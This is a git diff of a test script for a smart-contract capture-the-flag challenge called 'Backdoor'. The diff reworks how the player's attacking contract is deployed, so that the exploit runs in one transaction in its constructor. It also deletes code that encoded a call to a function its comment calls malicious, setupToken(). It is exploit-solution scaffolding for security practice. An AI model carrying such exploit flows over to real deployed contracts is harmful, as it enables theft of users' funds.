@@ -116,6 +116,8 @@ describe('[Challenge] Backdoor', function () {
         await checkTokenBalance(player.address, "Attacker");
 
         // Deploy attacking contract
+        // Do exploit in one transaction in contract constructor
+
         const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", player);
         const attackModule = await AttackModuleFactory.deploy(
             player.address,
@@ -125,24 +127,10 @@ describe('[Challenge] Backdoor', function () {
             attackerToken.address,
             users,
             {
-                gasLimit: 1e6
+                gasLimit: 1e7
             }
         );
-        console.log("Deployed attacking module at", attackModule.address);
-
-        // ABI call to setupToken() which is malicious
-        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
-        const moduleIFace = new ethers.utils.Interface(moduleABI);
-        const setupData = moduleIFace.encodeFunctionData("setupToken", [
-            attackerToken.address, 
-            attackModule.address
-        ])
-
-        console.log(setupData);
-
-        // // Do exploit in one transaction (after contract deployment)
-        // await attackModule.exploit(users, setupData);
-          
+        console.log("Deployed attacking contract at", attackModule.address);
         await checkTokenBalance(player.address, "Attacker");
 
     });
